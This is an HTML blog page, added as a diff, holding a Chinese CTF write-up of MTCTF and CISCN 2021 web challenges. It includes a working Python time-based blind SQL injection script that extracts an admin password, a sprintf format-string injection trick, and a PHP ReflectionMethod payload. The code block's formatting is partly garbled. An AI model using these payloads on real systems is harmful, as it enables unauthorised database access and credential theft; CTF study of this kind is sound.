@@ -1,0 +1,741 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/L.jpg">
+  <link rel="icon" type="image/png" href="/img/L.jpg">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#FFFFF2">
+  <meta name="description" content="BLOG">
+  <meta name="author" content="">
+  <meta name="keywords" content="">
+  <title>MTCTF CSICN - 1__/\/のblog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/arduino-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/shubiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/toubudaziji.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"lll-nnn.github.io","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":"❡"},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="1__/\/のblog" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 100vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>1__/\/</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/0018.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="MTCTF CSICN">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-05-25 14:48" pubdate>
+        2021年5月25日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.7k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      48
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+            <div class="scroll-down-bar">
+              <i class="iconfont icon-arrowdown"></i>
+            </div>
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">MTCTF CSICN</h1>
+            
+            <div class="markdown-body">
+              <h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><p>MT的第一题，时间盲注，但是常见的字符都过了<code>ascii</code>、<code>substr</code>,大于号小于号等于号，<code>lile</code>,<code>if</code>都过了，不会了   </p>
+<p><code>W&amp;M</code> 的WP   </p>
+<div class="hljs"><pre><code><pre><code class="hljs python">    <span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> req
+    <span class="hljs-keyword">import</span> time
+
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ord2hex</span>(<span class="hljs-params">string</span>):</span>
+    result = <span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string:
+        result += <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(i))
+
+    result = result.replace(<span class="hljs-string">&#x27;0x&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;0x&#x27;</span>+result
+
+
+    url = <span class="hljs-string">&quot;http://eci-2ze7bgvjvxtgmki6mtcj.cloudeci1.ichunqiu.com/index.php&quot;</span>
+    string = [<span class="hljs-built_in">ord</span>(i) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span>]
+    headers = &#123;
+        <span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0&#x27;</span>,
+        <span class="hljs-string">&#x27;Accept&#x27;</span>:<span class="hljs-string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,
+        <span class="hljs-string">&#x27;Connection&#x27;</span>:<span class="hljs-string">&#x27;keep-alive&#x27;</span>
+        &#125;
+
+    res = <span class="hljs-string">&#x27;&#x27;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">50</span>):
+    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> string:
+        passwd = ord2hex(<span class="hljs-string">&#x27;^&#x27;</span>+res+<span class="hljs-built_in">chr</span>(j))
+        <span class="hljs-comment">#print(passwd)</span>
+        passwd = <span class="hljs-string">&#x27;||case/**/when/**/password/**/regexp/**/binary/**/&#123;&#125;/**/then/**/sleep(3)/**/else/**/1111111/**/end/**/#&#x27;</span>.<span class="hljs-built_in">format</span>(passwd)
+        <span class="hljs-comment">#print(passwd)</span>
+        data = &#123;
+        <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&quot;admin\\&quot;</span>,
+        <span class="hljs-string">&#x27;password&#x27;</span>:passwd
+        &#125;
+        before_time = time.time()
+        r = req.post(url, data=data, headers=headers)
+        after_time = time.time()
+        <span class="hljs-comment">#print( r.text)</span>
+        offset = after_time - before_time
+        <span class="hljs-comment"># print(offset)</span>
+        <span class="hljs-keyword">if</span> (offset &gt; <span class="hljs-number">2</span>):
+        print(passwd)
+        res += <span class="hljs-built_in">chr</span>(j)
+        print(res)
+        <span class="hljs-keyword">break</span>
+    <span class="hljs-comment">#password This_1s_thE_Passw0rd</span>
+    ```    
+
+
+
+`case when`  
+
+![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">27e74714170</span>e20bb.png)    
+
+`regexp`正则匹配     
+
+这个匹配可以直接匹配到字符的十六进制，Mysql会将十六进制转换      
+
+![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">69215</span>b03e678fd6b.png)        
+
+<span class="hljs-comment">## easytricks </span>
+MT      
+也有SQL注入的点   
+` select * <span class="hljs-keyword">from</span> user where user=<span class="hljs-string">&#x27;$user&#x27;</span> <span class="hljs-keyword">and</span> passwd=<span class="hljs-string">&#x27;%s&#x27;</span>`    
+%s----&gt;字符串      
+
+[sprintf格式化注入漏洞](https://blog.csdn.net/weixin_41185953/article/details/<span class="hljs-number">80485075</span>)     
+
+`没做字符类型检测的最大危害就是它可以吃掉一个转义符\, 如果%后面出现一个\,那么php会把\当作一个格式化字符的类型而吃掉\, 最后%\（或%<span class="hljs-number">1</span>$\）被替换为空`  
+
+![](https://ftp.bmp.ovh/imgs/<span class="hljs-number">2021</span>/<span class="hljs-number">05</span>/<span class="hljs-number">7</span>b7afea854b5deba.png)     
+可以看到`%<span class="hljs-number">1</span>$`后的`<span class="hljs-string">&#x27;`被吞了      </span>
+<span class="hljs-string"></span>
+<span class="hljs-string">[MTCTF-2021 Write_Up by 打CTF不靠实力靠运气](https://mp.weixin.qq.com/s/zP7pOdL0zbWzKMJlVcff-Q)     </span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">##  easy_source   </span>
+<span class="hljs-string">CISCN   </span>
+<span class="hljs-string"></span>
+<span class="hljs-string"></span>
+<span class="hljs-string">`.index.php.swo`    </span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    ```php</span>
+<span class="hljs-string">    &lt;?php</span>
+<span class="hljs-string">    class User</span>
+<span class="hljs-string">    &#123;</span>
+<span class="hljs-string">        private static $c = 0;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function a()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function b()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function c()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function d()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function e()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function f()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function g()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function h()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function i()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function j()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function k()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function l()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function m()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function n()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function o()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function p()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function q()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function r()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function s()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">        function t()</span>
+<span class="hljs-string">        &#123;</span>
+<span class="hljs-string">            return ++self::$c;</span>
+<span class="hljs-string">        &#125;</span>
+<span class="hljs-string">        </span>
+<span class="hljs-string">    &#125;</span>
+<span class="hljs-string"></span>
+<span class="hljs-string">    $rc=$_GET[&quot;rc&quot;];</span>
+<span class="hljs-string">    $rb=$_GET[&quot;rb&quot;];</span>
+<span class="hljs-string">    $ra=$_GET[&quot;ra&quot;];</span>
+<span class="hljs-string">    $rd=$_GET[&quot;rd&quot;];</span>
+<span class="hljs-string">    $method= new $rc($ra, $rb);</span>
+<span class="hljs-string">    var_dump($method-&gt;$rd());</span></code></pre></div></code></pre>
+<p>利用PHP原生类读取类中的注释<br><code>ReflectionMethod</code>  </p>
+<p><code>public ReflectionMethod::__construct ( mixed $class , string $name )</code><br>–&gt;$class类的名称      </p>
+<p>–&gt;$name方法的名称         </p>
+<p>或者<code>public ReflectionMethod::__construct ( string $class_method )</code>      </p>
+<p>$class_method–&gt;类的名称和方法的名称中间以<code>::</code>分割      </p>
+<p>ReflectionMethod中的<code>getDocComment</code>可以返回注释 代码     </p>
+<p><img src="https://ftp.bmp.ovh/imgs/2021/05/e78bf4d72e174c59.png" srcset="/img/loading.gif">     </p>
+<p>payload:<code>rc=ReflectionMethond&amp;ra=User&amp;rb=q&amp;rd=getDocComment</code>      </p>
+<p>ReflectionMethod里的其他方法    </p>
+<div class="hljs"><pre><code>```php
+$ref = new ReflectionClass(B::class);
+
+//print_r(ReflectionClass::export(demo::class));
+print_r($ref-&gt;getProperties()); // 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。
+var_dump($ref-&gt;getConstructor()); // 获取构造函数, 未定义返回null
+var_dump($ref-&gt;inNamespace()); // 是否在命名空间中
+var_dump($ref-&gt;getConstants()); // 获取所有定义的常量
+var_dump($ref-&gt;getConstant(&#39;TEST_1&#39;)); // 获取某个常量
+print_r($ref-&gt;getDefaultProperties()); // 获取默认属性, 返回数组, 包括父类的属性
+var_dump($ref-&gt;getDocComment()); // 获取类文档注释, 不包含属性和方法的注释, 无注释返回false
+var_dump($ref-&gt;getExtension()); // 获取获取最后一行的行数
+var_dump($ref-&gt;getFileName()); // 获取定义类的文件名, 返回绝对路径
+var_dump($ref-&gt;getInterfaceNames()); // 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组
+var_dump($ref-&gt;getInterfaces()); // 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组
+var_dump($ref-&gt;getMethods()); // 指获取类方法 ReflectionMethod。
+var_dump($ref-&gt;getMethod(&#39;foo4&#39;)); // 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用
+var_dump($ref-&gt;getName()); // 获取类名, 包含命名空间
+var_dump($ref-&gt;getNamespaceName()); // 获取命名空间的名称, 没有返回空
+var_dump($ref-&gt;getParentClass()); // 获取父类reflectionClass的实例, 没有父类返回false
+var_dump($ref-&gt;getProperty(&#39;prop3&#39;)); // 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用
+var_dump($ref-&gt;getShortName()); // 获取类名, 不包含命名空间
+var_dump($ref-&gt;getStartLine()); // 获取起始行号
+print_r($ref-&gt;getStaticProperties()); // 获取静态属性
+print_r($ref-&gt;getStaticPropertyValue(&#39;prop_static&#39;)); // 获取静态属性值, 未定义的属性会报致命错误
+print_r($ref-&gt;getTraitAliases()); // 返回 trait 别名的一个数组
+print_r($ref-&gt;getTraitNames()); // 返回 trait 别名的一个数组
+print_r($ref-&gt;getTraits()); // 返回这个类所使用的 traits 数组
+var_dump($ref-&gt;hasConstant(&#39;AB&#39;)); // 检查常量是否已经定义
+var_dump($ref-&gt;hasMethod(&#39;AB&#39;)); // 检查方法是否已经定义
+var_dump($ref-&gt;hasProperty(&#39;AB&#39;)); // 检查属性是否已定义
+var_dump($ref-&gt;implementsInterface(&#39;reflection\Abc&#39;)); // 检查是否实现了某个接口, 注意需要带上命名空间
+var_dump($ref-&gt;isAbstract()); // 检查类是否是抽象类（abstract）
+var_dump($ref-&gt;isAnonymous()); // 检查类是否是匿名类
+var_dump($ref-&gt;isCloneable()); // 返回了一个类是否可复制
+var_dump($ref-&gt;isFinal()); // 检查类是否声明为 final
+var_dump($ref-&gt;isInstance($obj)); // 检查一个变量是否此类的实例
+var_dump($ref-&gt;isInstantiable()); // 检查类是否可实例化
+var_dump($ref-&gt;isInterface()); // 检查类是否是一个接口（interface）
+var_dump($ref-&gt;isInternal()); // 检查类是否由扩展或核心在内部定义, 和isUserDefined相对
+var_dump($ref-&gt;isIterateable()); // 检查此类是否可迭代, 实现了Iterator接口即可迭代
+var_dump($ref-&gt;isSubclassOf(A::class)); // 是否是某一个类的子类
+var_dump($ref-&gt;isTrait()); // 返回了是否为一个 trait
+var_dump($ref-&gt;isUserDefined()); // 检查是否由用户定义的类 和isInternal相对
+
+// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。
+// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。
+var_dump($ref-&gt;newInstance());
+// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。
+//这个参数以 array 形式传递到类的构造函数。
+var_dump($ref-&gt;newInstanceArgs([]));
+var_dump($ref-&gt;newInstanceWithoutConstructor()); // 创建一个新的实例而不调用他的构造函数
+$ref-&gt;setStaticPropertyValue (&#39;prop_static&#39;, &#39;222&#39;); // 设置静态属性的值, 无返回值
+var_dump($ref-&gt;__toString ()); // 返回 ReflectionClass 对象字符串的表示形式。
+​```</code></pre></div>
+<p><a target="_blank" rel="noopener" href="http://www.xl-bit.cn/index.php/archives/434/">Bit’s Blog —-CISCN2021—初赛—WP（及部分解题思路）</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/sql/">sql</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/CTF/">CTF</a>
+                    
+                      <a class="hover-with-bg" href="/tags/WP/">WP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/sql/">sql</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/05/27/NEEPUCTF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">NEEPUCTF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/05/24/BUU88/">
+                        <span class="hidden-mobile">Avatar Uploader 1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/qipao.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/yinghua.js"></script>
+<script src="//cdn.jsdelivr.net/gh/bynotes/texiao/source/js/boom.js"></script>
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+<!--//背景线条      {% if theme.canvas_nest %}-->
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+{% endif %}
+
+<!-- fireworks-->
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+
+</body>
+</html>
